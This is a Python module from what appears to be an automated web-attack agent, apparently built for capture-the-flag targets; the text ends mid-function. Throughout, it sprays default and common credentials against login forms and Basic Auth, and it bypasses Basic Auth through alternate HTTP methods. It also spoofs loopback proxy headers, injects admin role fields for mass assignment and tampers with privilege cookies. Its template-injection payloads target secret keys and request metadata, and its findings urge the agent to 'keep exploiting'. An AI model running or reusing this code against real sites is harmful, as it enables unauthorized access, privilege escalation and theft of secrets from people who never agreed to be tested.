from __future__ import annotations

import base64
import hashlib
import html
import json
import re
import time
from collections.abc import Sequence
from dataclasses import dataclass, field
from urllib.parse import parse_qsl, urlencode, urljoin, urlsplit, urlunsplit

from ravage.agent_core.agent_state import AgentState
from ravage.deterministic_agents.auth_credentials import (
    _common_credential_identities,
    _default_credential_identities,
    _default_credential_identities_for_state,
)
from ravage.deterministic_agents.auth_discovery import (
    _auth_forms,
    _discover_auth_forms,
    _form_looks_login_related,
    _form_looks_registration_related,
    _ordered_auth_forms,
)
from ravage.deterministic_agents.auth_client_followup import (
    _client_side_authenticated_followup,
    _client_side_object_templates,
    _html_object_ids,
    _looks_identity_header_name,
)
from ravage.deterministic_agents.auth_followup_targets import (
    _authenticated_privilege_form_followup,
)
from ravage.deterministic_agents.auth_object_targets import (
    _dedupe_scoped_urls,
    _object_id_hint_followup,
    _object_sibling_urls,
)
from ravage.deterministic_agents.auth_forms import (
    _auth_form_brief,
    _body_has_login_form,
    _body_has_password_form,
    _dedupe_dicts,
    _form_has_password_input,
    _form_script_headers,
    _forms_from_html,
    _fresh_form_from_response,
    _script_adjusted_password_form,
    _script_identity_headers,
    _submit_form,
)
from ravage.deterministic_agents.auth_identity import (
    _identity,
    _identity_fields,
    _preserve_working_credential_values,
)
from ravage.deterministic_agents.auth_materials import (
    _auth_header_variants,
    _auth_materials,
    _authenticated_followup_signal,
    _dedupe_auth_materials,
    _dedupe_headers,
    _redact_auth_headers,
)
from ravage.deterministic_agents.auth_session_support import (
    IdentityDelta,
    IdentityResult,
    SecondStepResult,
    access_score,
    cookie_is_privilege_like,
    fork_session,
    has_auth_proof,
    ordered_admin_urls,
    privilege_cookie_variants,
    rebuild_cookie_header,
    record_auth_proof,
    serialized_auth_cookie_findings,
    session_cookie_pairs,
    set_cookie_pairs,
)
from ravage.probe_suite_parts.result import ProbeRunResult
from ravage.probe_suite_parts.support import (
    _body_words,
    _contains_word,
    _dedupe,
    _form_brief,
    _form_text,
    _list_of_dicts,
    _string_items,
    _surface_endpoints,
)
from ravage.web_core.http_probe import (
    ProbeResponse,
    ProbeSession,
    form_defaults,
)
from ravage.web_core.proof_recognizer import recognize_proofs

_AUTH_FORM_LIMIT = 6
_CREDENTIAL_SPRAY_LIMIT = 20
_DEFAULT_CREDENTIAL_SPRAY_LIMIT = 56
_BASIC_AUTH_SPRAY_LIMIT = 18
_AUTH_PROBE_WALL_SECONDS = 22.0
_AUTH_REQUEST_TIMEOUT_SECONDS = 3
_FOLLOWUP_LIMIT = 18
_AUTH_HEADER_LIMIT = 10
_DEFERRED_FORM_FLOW_LIMIT = 56
_AUTH_RESULT_REQUEST_LIMIT = 240
_DEFERRED_FORM_FLOW_PAYLOADS = (
    '{{ 7|add:"42" }}',
    "{{ flag }}",
    "{{flag}}",
    "{{ ctf_flag }}",
    "{{ctf_flag}}",
    "{{ proof }}",
    "{{ secret }}",
    "{{ settings.SECRET_KEY }}",
    "{{settings.SECRET_KEY}}",
    "{{ settings.FLAG }}",
    "{{settings.FLAG}}",
    "{{ request.META }}",
    "{{ request.META|pprint }}",
    "{{7*7}}",
    "{{7*'7'}}",
    "${7*7}",
    "<%= 7*7 %>",
)
_TRUSTED_PROXY_LOGIN_HEADERS = (
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;proto=http;host=localhost"},
)
_TRUSTED_PROXY_LOGIN_ATTEMPT_LIMIT = 36


def _fork_session(base_session: ProbeSession, timeout_seconds: int) -> ProbeSession:
    return fork_session(base_session, timeout_seconds, session_factory=ProbeSession)


def probe_auth_session(session: ProbeSession, state: AgentState) -> ProbeRunResult:
    started = time.monotonic()
    auth_forms = _auth_forms(state)
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    if not auth_forms:
        discovered_forms, discovery_requests = _discover_auth_forms(session, state)
        auth_forms.extend(discovered_forms)
        requests.extend(discovery_requests)
    auth_forms = _ordered_auth_forms(auth_forms)
    if not _auth_deadline_exceeded(started):
        _deferred_form_flow_followup(
            session,
            auth_forms[:_AUTH_FORM_LIMIT],
            findings,
            requests,
            started=started,
        )
        if has_auth_proof(findings):
            return ProbeRunResult(
                ok=True,
                probe="stateful_session",
                summary=f"submitted {len(auth_forms[:_AUTH_FORM_LIMIT])} auth-like form(s), findings={len(findings)}",
                findings=_prioritize_findings(findings)[:30],
                requests=requests[:_AUTH_RESULT_REQUEST_LIMIT],
            )
    credential_budget = _CREDENTIAL_SPRAY_LIMIT
    for form in auth_forms[:_AUTH_FORM_LIMIT]:
        if _auth_deadline_exceeded(started):
            break
        identity_a = _identity("a")
        identity_b = _identity("b")
        result_a = _submit_identity(session, form, identity_a, state=state)
        if _auth_deadline_exceeded(started) or _form_looks_registration_related(form):
            results = [result_a]
        else:
            result_b = _submit_identity(
                _fork_session(session, _bounded_auth_timeout(session)),
                form,
                identity_b,
                state=state,
            )
            results = [result_a, result_b]

        if _form_looks_login_related(form):
            spray_identities = _common_credential_identities()
        else:
            spray_identities = []

        for identity in spray_identities:
            if credential_budget <= 0 or _auth_deadline_exceeded(started):
                break
            credential_budget -= 1
            result = _submit_identity(
                _fork_session(session, _bounded_auth_timeout(session)),
                form,
                identity,
                state=state,
            )
            results.append(result)

        if len(results) > 1:
            result_b = results[1]
        else:
            result_b = None

        for result in results:
            requests.extend(result.requests)
            findings.extend(result.findings)
            if not result.authenticated and not result.auth_headers:
                continue
            followup = _single_session_followup(
                session=result.session,
                state=state,
                username=result.username,
                auth_headers=result.auth_headers,
                seed_urls=_post_login_seed_urls(session=result.session, findings=result.findings),
            )
            requests.extend(followup.requests)
            if followup.finding:
                findings.append(followup.finding)
            if _auth_deadline_exceeded(started):
                break
        if result_b is not None and result_a.authenticated and result_b.authenticated:
            delta = _identity_delta(
                session_a=result_a.session,
                session_b=result_b.session,
                state=state,
            )
            requests.extend(delta.requests)
            if delta.finding:
                findings.append(delta.finding)

    if not has_auth_proof(findings) and not _auth_deadline_exceeded(started):
        _trusted_proxy_header_login_followup(
            session, state, auth_forms[:_AUTH_FORM_LIMIT], findings, requests, started=started
        )
    if not has_auth_proof(findings) and not _auth_deadline_exceeded(started):
        _privilege_field_followup(session, state, auth_forms[:_AUTH_FORM_LIMIT], findings, requests)
    if not has_auth_proof(findings) and not _auth_deadline_exceeded(started):
        _cookie_privilege_followup(session, state, findings, requests)
    if not has_auth_proof(findings) and not _auth_deadline_exceeded(started):
        _deferred_form_flow_followup(
            session,
            auth_forms[:_AUTH_FORM_LIMIT],
            findings,
            requests,
            started=started,
        )
    return ProbeRunResult(
        ok=bool(findings),
        probe="stateful_session",
        summary=f"submitted {len(auth_forms[:_AUTH_FORM_LIMIT])} auth-like form(s), findings={len(findings)}",
        findings=_prioritize_findings(findings)[:30],
        requests=requests[:_AUTH_RESULT_REQUEST_LIMIT],
    )


def probe_default_credentials(session: ProbeSession, state: AgentState) -> ProbeRunResult:
    started = time.monotonic()
    auth_forms = _auth_forms(state)
    requests: list[dict[str, object]] = []
    findings: list[dict[str, object]] = []
    if not auth_forms:
        discovered_forms, discovery_requests = _discover_auth_forms(session, state)
        auth_forms.extend(discovered_forms)
        requests.extend(discovery_requests)
    login_forms = [
        form
        for form in _ordered_auth_forms(auth_forms)
        if not _form_looks_registration_related(form)
        and (_form_looks_login_related(form) or _form_has_password_input(form))
    ]
    credential_identities = _default_credential_identities_for_state(
        session,
        state,
        requests,
        auth_forms=auth_forms,
        limit=_DEFAULT_CREDENTIAL_SPRAY_LIMIT,
    )
    attempts = 0
    progress_candidates: list[dict[str, object]] = []
    for form in login_forms[:_AUTH_FORM_LIMIT]:
        for identity in credential_identities:
            if attempts >= _DEFAULT_CREDENTIAL_SPRAY_LIMIT or _auth_deadline_exceeded(started):
                break
            attempts += 1
            result = _submit_identity(session, form, identity, state=state)
            requests.extend(result.requests)
            result_has_proof = has_auth_proof(result.findings)
            if not result.authenticated and not result.auth_headers and not result_has_proof:
                progress_findings = _auth_workflow_progress_findings(result.findings)
                if progress_findings:
                    progress_candidates.extend(progress_findings)
                continue
            followup = _quick_session_followup(
                session=result.session,
                state=state,
                username=identity["username"],
                password=identity["password"],
                auth_headers=result.auth_headers,
                seed_urls=_post_login_seed_urls(session=result.session, findings=result.findings),
            )
            requests.extend(followup.requests)
            if followup.finding:
                findings.append(followup.finding)
            if not (
                result.authenticated
                or result_has_proof
                or _followup_confirms_auth(followup.finding)
            ):
                progress_findings = _auth_workflow_progress_findings(result.findings)
                if progress_findings:
                    progress_candidates.extend(progress_findings)
                continue
            findings.extend(result.findings)
            findings.append(
                {
                    "type": "default_credentials_valid",
                    "form": _auth_form_brief(form),
                    "username": identity["username"],
                    "password": identity["password"],
                    "authenticated": bool(
                        result.authenticated or _followup_confirms_auth(followup.finding)
                    ),
                    "auth_headers": _redacted_auth_headers_for_finding(result.auth_headers),
                    "next": "Use this authenticated session to sweep profile/admin/API pages and IDOR/BOLA object routes.",
                }
            )
            if has_auth_proof(findings):
                return _default_credentials_result(login_forms, attempts, findings, requests)
            break
        if findings or _auth_deadline_exceeded(started):
            break

    if not findings and progress_candidates:
        findings.extend(_dedupe_dicts(progress_candidates)[:6])

    if not findings and not _auth_deadline_exceeded(started):
        _trusted_proxy_header_login_followup(
            session, state, login_forms[:_AUTH_FORM_LIMIT], findings, requests, started=started
        )

    if not findings and not _auth_deadline_exceeded(started):
        _basic_auth_default_followup(session, state, findings, requests)

    return _default_credentials_result(login_forms, attempts, findings, requests)


def _default_credentials_result(
    login_forms: list[dict[str, object]],
    attempts: int,
    findings: list[dict[str, object]],
    requests: list[dict[str, object]],
) -> ProbeRunResult:
    return ProbeRunResult(
        ok=bool(findings),
        probe="default_credentials",
        summary=(
            f"tested {len(login_forms[:_AUTH_FORM_LIMIT])} login-like form(s), "
            f"credential_attempts={attempts}, findings={len(findings)}"
        ),
        findings=_prioritize_findings(findings)[:30],
        requests=requests[:_AUTH_RESULT_REQUEST_LIMIT],
    )


def _auth_workflow_progress_findings(findings: list[dict[str, object]]) -> list[dict[str, object]]:
    progress: list[dict[str, object]] = []
    for finding in findings:
        if finding.get("type") == "auth_workflow_progress_signal":
            progress.append(finding)
    return progress


def _followup_confirms_auth(finding: dict[str, object] | None) -> bool:
    if not finding:
        return False
    if finding.get("proofs"):
        return True
    finding_type = str(finding.get("type") or "")
    if finding_type != "auth_session_followup_signal":
        return False
    signal = finding.get("signal")
    if not isinstance(signal, dict):
        return False
    return str(signal.get("kind") or "") in {"authenticated_body_markers", "auth_material_accepted"}


def _redacted_auth_headers_for_finding(headers_list: list[dict[str, str]]) -> list[dict[str, str]]:
    redacted: list[dict[str, str]] = []
    for headers in headers_list[:4]:
        redacted.append(_redact_auth_headers(headers))
    return redacted


def _basic_auth_default_followup(
    session: ProbeSession,
    state: AgentState,
    findings: list[dict[str, object]],
    requests: list[dict[str, object]],
) -> None:
    urls = _dedupe([session.target_url, *_session_followup_urls(session, state)])
    baselines: dict[str, ProbeResponse] = {}
    method_bypass_attempted: set[str] = set()
    attempts = 0
    for identity in _default_credential_identities()[:_BASIC_AUTH_SPRAY_LIMIT]:
        token = base64.b64encode(
            f"{identity['username']}:{identity['password']}".encode("utf-8")
        ).decode("ascii")
        headers = {"Authorization": f"Basic {token}"}
        for url in urls[:6]:
            if attempts >= _BASIC_AUTH_SPRAY_LIMIT:
                return
            attempts += 1
            baseline = baselines.get(url)
            if baseline is None:
                baseline = session.get(url)
                baselines[url] = baseline
                requests.append(
                    baseline.summary(body_chars=160)
                    | {"probe_kind": "default_credentials_basic_auth_baseline", "url": url}
                )
            if _basic_auth_challenged(baseline) and url not in method_bypass_attempted:
                method_bypass_attempted.add(url)
                _basic_auth_method_bypass_followup(session, url, baseline, findings, requests)
                if findings:
                    return
            response = session.get(url, headers=headers)
            requests.append(
                response.summary(body_chars=420)
                | {
                    "probe_kind": "default_credentials_basic_auth",
                    "url": url,
                    "username": identity["username"],
                }
            )
            proofs = recognize_proofs(response.body)
            if proofs:
                findings.append(
                    {
                        "type": "auth_extracted_proof",
                        "channel": "default_credentials_basic_auth",
                        "detail": url,
                        "proof": proofs[0],
                        "proofs": proofs,
                    }
                )
                return
            baseline_challenged = baseline.status in {401, 403} or "www-authenticate" in {
                name.lower() for name in baseline.headers
            }
            if (
                baseline_challenged
                and response.status not in {401, 403}
                and access_score(response) > access_score(baseline)
            ):
                findings.append(
                    {
                        "type": "default_credentials_valid",
                        "scheme": "basic",
                        "url": url,
                        "username": identity["username"],
                        "password": identity["password"],
                        "response": response.summary(body_chars=520),
                    }
                )
                return


def _basic_auth_challenged(response: ProbeResponse) -> bool:
    if response.status in {401, 403}:
        return True
    return "www-authenticate" in {name.lower() for name in response.headers}


def _basic_auth_method_bypass_followup(
    session: ProbeSession,
    url: str,
    baseline: ProbeResponse,
    findings: list[dict[str, object]],
    requests: list[dict[str, object]],
) -> None:
    first_signal: dict[str, object] | None = None
    for candidate_url in _basic_auth_method_bypass_urls(url):
        for method in ("PUT", "PATCH", "OPTIONS", "PROPFIND", "DELETE", "HEAD"):
            response = session.request(method, candidate_url)
            requests.append(
                response.summary(body_chars=520)
                | {
                    "probe_kind": "basic_auth_method_bypass",
                    "url": candidate_url,
                    "method": method,
                }
            )
            proofs = recognize_proofs(response.body)
            if proofs:
                findings.append(
                    {
                        "type": "auth_extracted_proof",
                        "channel": "basic_auth_method_bypass",
                        "detail": f"{method} {candidate_url}",
                        "proof": proofs[0],
                        "proofs": proofs,
                        "response": response.summary(body_chars=900),
                        "replay": {"method": method, "url": candidate_url},
                    }
                )
                return
            if first_signal is None and _basic_auth_method_bypass_signal(baseline, response):
                first_signal = {
                    "type": "basic_auth_method_bypass_signal",
                    "url": candidate_url,
                    "method": method,
                    "baseline": baseline.summary(body_chars=240),
                    "response": response.summary(body_chars=520),
                    "replay": {"method": method, "url": candidate_url},
                    "next": (
                        "The Basic Auth challenge appears scoped to only some HTTP methods. "
                        "Use the alternate method replay to read the protected resource."
                    ),
                }
    if first_signal is not None:
        findings.append(first_signal)


def _basic_auth_method_bypass_urls(url: str) -> list[str]:
    split = urlsplit(url)
    path = split.path or "/"
    candidates = [url]
    directories: list[str] = []
    if path.endswith("/"):
        directories.append(path)
    elif "." not in path.rsplit("/", 1)[-1]:
        directories.append(path.rstrip("/") + "/")
    parent = path.rsplit("/", 1)[0] + "/"
    directories.append(parent if parent.startswith("/") else f"/{parent}")
    for directory in _dedupe(directories):
        base = urlunsplit((split.scheme, split.netloc, directory, "", ""))
        for filename in ("index.php", "index.html", "index.htm", "index.cgi", "index.pl"):
            candidates.append(urljoin(base, filename))
    return _dedupe(candidates)


def _basic_auth_method_bypass_signal(
    baseline: ProbeResponse,
    response: ProbeResponse,
) -> bool:
    if response.status is None or response.status in {401, 403, 404, 405}:
        return False
    if response.method == "HEAD" and not response.body:
        return False
    if _basic_auth_challenged(response):
        return False
    return access_score(response) > access_score(baseline) or bool(response.body.strip())


def _trusted_proxy_header_login_followup(
    base_session: ProbeSession,
    state: AgentState,
    forms: list[dict[str, object]],
    findings: list[dict[str, object]],
    requests: list[dict[str, object]],
    *,
    started: float,
) -> None:
    login_forms = [
        form
        for form in _ordered_auth_forms(forms)
        if _form_looks_login_related(form) or _form_has_password_input(form)
    ]
    if not login_forms:
        return
    identities = _default_credential_identities()[:5] + [_identity("proxy")]
    attempts = 0
    for form in login_forms[:_AUTH_FORM_LIMIT]:
        for headers in _TRUSTED_PROXY_LOGIN_HEADERS:
            for identity in identities:
                if attempts >= _TRUSTED_PROXY_LOGIN_ATTEMPT_LIMIT or _auth_deadline_exceeded(
                    started
                ):
                    return
                attempts += 1
                fresh = _fork_session(base_session, _bounded_auth_timeout(base_session))
                fresh_form = _fresh_form_for_submission(fresh, form)
                fields = _identity_fields(fresh_form, identity)
                submitted = _submit_form(fresh, fresh_form, fields, headers=headers)
                requests.append(
                    submitted.summary(body_chars=420)
                    | {
                        "probe_kind": "auth_trusted_proxy_header_login",
                        "form": _auth_form_brief(fresh_form),
                        "username": identity["username"],
                        "headers_used": _redact_auth_headers(headers),
                    }
                )
                if record_auth_proof(
                    submitted.body,
                    findings,
                    channel="trusted_proxy_header_login",
                    detail=f"{_auth_form_brief(fresh_form)} headers={_redact_auth_headers(headers)}",
                ):
                    return
                final = _follow_auth_redirect(fresh, submitted, requests, step=0)
                if final is not submitted and record_auth_proof(
                    final.body,
                    findings,
                    channel="trusted_proxy_header_login_redirect",
                    detail=final.final_url,
                ):
                    return
                if not _auth_submission_succeeded(final):
                    continue
                findings.append(
                    {
                        "type": "trusted_proxy_header_auth_signal",
                        "form": _auth_form_brief(fresh_form),
                        "username": identity["username"],
                        "password": identity["password"],
                        "headers": _redact_auth_headers(headers),
                        "status": final.status,
                        "final_url": final.final_url,
                        "response": final.summary(body_chars=520),
                        "replay": {
                            "method": str(fresh_form.get("method") or "GET").upper(),
                            "url": str(fresh_form.get("action") or ""),
                            "form": fields,
                            "headers": headers,
                            "encoding": "application/x-www-form-urlencoded",
                        },
                        "next": "Replay the same login form with this loopback/proxy header and sweep authenticated pages.",
                    }
                )
                followup = _single_session_followup(
                    session=fresh,
                    state=state,
                    username=identity["username"],
                    auth_headers=[headers],
                    seed_urls=[final.final_url],
                )
                requests.extend(followup.requests)
                if followup.finding:
                    findings.append(followup.finding)
                return


def _auth_deadline_exceeded(started: float) -> bool:
    return time.monotonic() - started >= _AUTH_PROBE_WALL_SECONDS


def _bounded_auth_timeout(session: ProbeSession) -> int:
    return min(session.timeout_seconds, _AUTH_REQUEST_TIMEOUT_SECONDS)


def _prioritize_findings(findings: list[dict[str, object]]) -> list[dict[str, object]]:
    def priority(finding: dict[str, object]) -> int:
        finding_type = str(finding.get("type") or "")
        if finding_type == "auth_extracted_proof" or finding.get("proofs"):
            return 0
        if finding_type in {
            "privilege_escalation_signal",
            "cookie_privilege_tamper_signal",
            "insecure_deserialization_cookie_signal",
            "auth_workflow_progress_signal",
            "default_credentials_valid",
            "trusted_proxy_header_auth_signal",
        }:
            return 1
        return 2

    return sorted(findings, key=priority)


_ESCALATION_FIELDS: dict[str, str] = {
    "role": "admin",
    "roles": "admin",
    "is_admin": "true",
    "isAdmin": "true",
    "admin": "1",
    "usertype": "admin",
    "user_type": "admin",
    "account_type": "premium",
    "is_staff": "true",
    "is_superuser": "true",
    "level": "9",
    "group": "admin",
    "privilege": "admin",
    "privileges": "admin",
    "is_premium": "on",
    "premium": "true",
    "is_paid": "true",
    "paid": "true",
    "membership": "premium",
    "plan": "premium",
    "tier": "premium",
    "subscription": "premium",
    "upgrade": "true",
    "vip": "true",
}


def _privilege_field_followup(
    session: ProbeSession,
    state: AgentState,
    forms: list[dict[str, object]],
    findings: list[dict[str, object]],
    requests: list[dict[str, object]],
) -> None:
    for form in forms[:3]:
        identity = _identity("esc")
        fresh = _fork_session(session, session.timeout_seconds)
        form = _fresh_form_for_submission(fresh, form)
        fields = _identity_fields(form, identity)
        fields.update(_ESCALATION_FIELDS)
        submitted = _submit_form(fresh, form, fields)
        requests.append(
            submitted.summary(body_chars=240)
            | {
                "probe_kind": "auth_privilege_field_submit",
                "form": _form_brief(form),
                "escalation_fields": list(_ESCALATION_FIELDS),
            }
        )

        if record_auth_proof(
            submitted.body, findings, channel="privilege_field_submission", detail=_form_brief(form)
        ):
            return

        if _walk_escalation_wizard(fresh, identity, submitted, findings, requests):
            return
        second = _complete_password_step(fresh, submitted, identity)
        final = second.final_response or submitted
        requests.extend(second.requests)
        if final is not submitted and record_auth_proof(
            final.body, findings, channel="privilege_field_post_login", detail=_form_brief(form)
        ):
            return
        if not _auth_submission_succeeded(final):
            continue
        followup = _single_session_followup(
            session=fresh, state=state, username=identity["username"], auth_headers=[]
        )
        requests.extend(followup.requests)
        if followup.finding:
            findings.append(followup.finding)
        admin_score, admin_response = _max_admin_access(fresh, state, requests)
        if admin_response is not None and record_auth_proof(
            admin_response.body,
            findings,
            channel="privilege_field_post_login",
            detail=_form_brief(form),
        ):
            return
        if admin_score >= 2:
            findings.append(
                {
                    "type": "privilege_escalation_signal",
                    "vector": "mass_assignment_role_field",
                    "form": _form_brief(form),
                    "escalation_fields": list(_ESCALATION_FIELDS),
                    "detail": "registering/logging in with escalated role fields reached an admin-only surface",
                }
            )
            return


def _cookie_privilege_followup(
    session: ProbeSession,
    state: AgentState,
    findings: list[dict[str, object]],
    requests: list[dict[str, object]],
) -> None:
    fresh = _fork_session(session, session.timeout_seconds)
    urls = _session_followup_urls(fresh, state)
    cookies: dict[str, str] = {}
    for url in urls[:5]:
        response = fresh.get(url)
        requests.append(
            response.summary(body_chars=120) | {"probe_kind": "cookie_tamper_seed", "url": url}
        )
        for name, value in set_cookie_pairs(response.headers.get("set-cookie", "")):
            cookies.setdefault(name, value)
    for cookie in fresh.cookies:
        if cookie.name and cookie.value:
            cookies.setdefault(cookie.name, cookie.value)
    if not cookies:
        return
    admin_urls = ordered_admin_urls(urls)
    baseline = _baseline_admin_access(fresh, admin_urls[:3])
    for name, value in cookies.items():
        if not cookie_is_privilege_like(name, value):
            continue
        for tampered in privilege_cookie_variants(value):
            header = rebuild_cookie_header(cookies, name, tampered)
            for url in admin_urls[:6]:
                response = fresh.get(url, headers={"Cookie": header})
                requests.append(
                    response.summary(body_chars=200)
                    | {
                        "probe_kind": "cookie_privilege_tamper",
                        "cookie": name,
                        "tampered_to": tampered,
                        "url": url,
                    }
                )
                if record_auth_proof(
                    response.body,
                    findings,
                    channel="cookie_privilege_tamper",
                    detail=f"{name}={tampered}",
                ):
                    return
                if access_score(response) > baseline:
                    findings.append(
                        {
                            "type": "cookie_privilege_tamper_signal",
                            "cookie": name,
                            "tampered_to": tampered,
                            "url": url,
                            "detail": "tampered privilege cookie reached an admin surface beyond the baseline",
                        }
                    )
                    return


def _baseline_admin_access(session: ProbeSession, admin_urls: list[str]) -> int:
    baseline = 0
    for url in admin_urls:
        score = access_score(session.get(url))
        if score > baseline:
            baseline = score
    return baseline


_WIZARD_FORM_MARKERS = (
    "step",
    "register",
    "signup",
    "sign-up",
    "continue",
    "next",
    "account",
    "premium",
    "upgrade",
    "membership",
    "checkout",
    "password",
)
_WORKFLOW_COMPLETION_MARKERS = (
    "welcome",
    "premium",
    "dashboard",
    "account",
    "flag",
    "upgraded",
    "member",
    "success",
    "congratulations",
    "thank you",
    "logout",
)
_STRONG_WORKFLOW_COMPLETION_MARKERS = (
    "welcome",
    "premium",
    "dashboard",
    "account",
    "flag",
    "upgraded",
    "member",
    "congratulations",
    "logout",
)
_WIZARD_MAX_STEPS = 5


def _walk_escalation_wizard(
    fresh: ProbeSession,
    identity: dict[str, str],
    response: ProbeResponse,
    findings: list[dict[str, object]],
    requests: list[dict[str, object]],
) -> bool:
    current = response
    seen_actions: set[str] = set()
    for step in range(_WIZARD_MAX_STEPS):
        current = _follow_wizard_redirect(fresh, current, requests, step=step)
        if record_auth_proof(
            current.body, findings, channel="auth_wizard_redirect", detail=current.final_url
        ):
            return True
        next_form = _next_wizard_form(fresh, current, seen_actions)
        if next_form is None:
            break
        seen_actions.add(str(next_form.get("action") or ""))
        fields = _identity_fields(next_form, identity)
        fields.update(_ESCALATION_FIELDS)
        submitted = _submit_form(fresh, next_form, fields)
        requests.append(
            submitted.summary(body_chars=240)
            | {"probe_kind": "auth_wizard_step", "step": step, "form": _form_brief(next_form)}
        )
        if record_auth_proof(
            submitted.body, findings, channel="auth_wizard_step", detail=_form_brief(next_form)
        ):
            return True
        current = _follow_wizard_redirect(fresh, submitted, requests, step=step)
        if record_auth_proof(
            current.body, findings, channel="auth_wizard_step_redirect", detail=current.final_url
        ):
            return True
    if current is not response:
        _emit_workflow_completed(fresh, current, findings)
        return record_auth_proof(
            current.body, findings, channel="auth_workflow_completed", detail=current.final_url
        )
    return False


def _follow_wizard_redirect(
    session: ProbeSession,
    response: ProbeResponse,
    requests: list[dict[str, object]],
    *,
    step: int,
) -> ProbeResponse:
    location = str(response.headers.get("location") or response.headers.get("Location") or "")
    if not location or not _same_origin_or_relative(session, location):
        return response
    page = session.get(location)
    requests.append(
        page.summary(body_chars=360)
        | {"probe_kind": "auth_wizard_redirect_page", "location": location, "step": step}
    )
    return page


def _next_wizard_form(
    fresh: ProbeSession, response: ProbeResponse, seen_actions: set[str]
) -> dict[str, object] | None:
    for form in _forms_from_html(
        response.final_url, response.body, auth_headers={}, base_categories=()
    ):
        action = str(form.get("action") or "")
        if action in seen_actions or not form_defaults(form):
            continue
        text = (action + " " + _form_text(form)).lower()
        if _text_contains_marker(text, _WIZARD_FORM_MARKERS):
            return _fresh_form_for_submission(fresh, form)
    return None


def _emit_workflow_completed(
    fresh: ProbeSession, response: ProbeResponse, findings: list[dict[str, object]]
) -> None:
    proofs = recognize_proofs(response.body)
    markers = _body_words(response.body, _WORKFLOW_COMPLETION_MARKERS)
    if not proofs and not _auth_materials(response) and not _has_strong_workflow_marker(markers):
        return
    findings.append(
        {
            "type": "auth_workflow_completed_signal",
            "final_url": response.final_url,
            "status": response.status,
            "proofs": proofs,
            "markers": markers,
            "forms": _workflow_completion_forms(response),
            "detail": "multi-step auth/registration workflow reached a completed state; keep exploiting it",
        }
    )


def _text_contains_marker(text: str, markers: tuple[str, ...]) -> bool:
    for marker in markers:
        if marker in text:
            return True
    return False


def _has_strong_workflow_marker(markers: list[str]) -> bool:
    for marker in markers:
        if marker in _STRONG_WORKFLOW_COMPLETION_MARKERS:
            return True
    return False


def _workflow_completion_forms(response: ProbeResponse) -> list[dict[str, object]]:
    forms: list[dict[str, object]] = []
    parsed_forms = _forms_from_html(
        response.final_url, response.body, auth_headers={}, base_categories=()
    )
    for form in parsed_forms[:3]:
        forms.append(_form_brief(form))
    return forms


def _max_admin_access(
    session: ProbeSession, state: AgentState, requests: list[dict[str, object]]
) -> tuple[int, ProbeResponse | None]:
    best_score = 0
    best_response: ProbeResponse | None = None
    for url in ordered_admin_urls(_session_followup_urls(session, state))[:8]:
        response = session.get(url)
        requests.append(
            response.summary(body_chars=160) | {"probe_kind": "privilege_followup", "url": url}
        )
        score = access_score(response)
        if score > best_score:
            best_score, best_response = score, response
    return best_score, best_response


def _submit_identity(
    base_session: ProbeSession,
    form: dict[str, object],
    identity: dict[str, str],
    *,
    state: AgentState | None = None,
) -> IdentityResult:
    session = _fork_session(base_session, _bounded_auth_timeout(base_session))
    action = str(form.get("action") or session.target_url)
    baseline = session.get(action)
    form = _fresh_form_from_response(form, baseline) or form
    fields = _identity_fields(form, identity)
    submitted = _submit_form(session, form, fields)
    second_step = _complete_password_step(session, submitted, identity)
    final_response = second_step.final_response or submitted
    requests = [
        baseline.summary(body_chars=120)
        | {"probe_kind": "auth_form_baseline", "form": _auth_form_brief(form)},
        submitted.summary(body_chars=260)
        | {
            "probe_kind": "auth_form_submit",
            "form": _auth_form_brief(form),
            "username": identity["username"],
        },
    ]
    requests.extend(second_step.requests)
    findings: list[dict[str, object]] = []
    auth_materials = _dedupe_auth_materials(
        _auth_materials(submitted) + _auth_materials(final_response)
    )
    auth_headers = _dedupe_headers(_auth_header_variants(auth_materials) + second_step.auth_headers)
    authenticated = _auth_submission_succeeded(final_response)
    progress_finding = _auth_workflow_progress_finding(
        session=session,
        form=form,
        fields=fields,
        submitted=submitted,
        second_step=second_step,
    )

    record_auth_proof(
        submitted.body, findings, channel="auth_form_submit_response", detail=_auth_form_brief(form)
    )
    if final_response is not submitted:
        record_auth_proof(
            final_response.body,
            findings,
            channel="auth_form_final_response",
            detail=_auth_form_brief(form),
        )
    object_id_followup = _object_id_hint_followup(
        session=session,
        state=state,
        responses=[baseline, submitted, final_response],
        headers={},
    )
    requests.extend(object_id_followup.requests)
    if object_id_followup.finding:
        findings.append(object_id_followup.finding)
    if authenticated:
        cookie_pairs = session_cookie_pairs(session)
        findings.append(
            {
                "type": "auth_form_submission",
                "form": _auth_form_brief(form),
                "username": identity["username"],
                "status": final_response.status,
                "final_url": final_response.final_url,
                "cookie_header": final_response.headers.get("set-cookie", ""),
                "cookies": _cookie_pair_strings(cookie_pairs),
                "auth_materials": _auth_material_jsons(auth_materials),
                "proofs": recognize_proofs(final_response.body),
                "body_markers": _body_words(
                    final_response.body,
                    (
                        "logout",
                        "profile",
                        "account",
                        "welcome",
                        "dashboard",
                        "csrf",
                        "invalid",
                        "token",
                    ),
                ),
                "replay": {
                    "method": str(form.get("method") or "GET").upper(),
                    "url": str(form.get("action") or ""),
                    "form": fields,
                    "encoding": "application/x-www-form-urlencoded",
                    "followup_steps": second_step.replay_steps,
                },
            }
        )
        findings.extend(serialized_auth_cookie_findings(cookie_pairs))
    elif progress_finding:
        findings.append(progress_finding)
    return IdentityResult(
        session=session,
        username=identity["username"],
        auth_headers=auth_headers,
        authenticated=authenticated,
        findings=findings,
        requests=requests,
    )


def _cookie_pair_strings(cookie_pairs: list[tuple[str, str]]) -> list[str]:
    values: list[str] = []
    for name, value in cookie_pairs:
        values.append(f"{name}={value}")
    return values


def _auth_material_jsons(auth_materials: Sequence[object]) -> list[dict[str, object]]:
    values: list[dict[str, object]] = []
    for material in auth_materials[:8]:
        to_json = getattr(material, "to_json", None)
        if not callable(to_json):
            continue
        raw = to_json()
        if isinstance(raw, dict):
            values.append(dict(raw))
    return values


def _auth_workflow_progress_finding(
    *,
    session: ProbeSession,
    form: dict[str, object],
    fields: dict[str, str],
    submitted: ProbeResponse,
    second_step: SecondStepResult,
) -> dict[str, object] | None:
    location = str(submitted.headers.get("location") or submitted.headers.get("Location") or "")
    if not location or not _same_origin_or_relative(session, location):
        return None
    absolute_location = session.absolute(location)
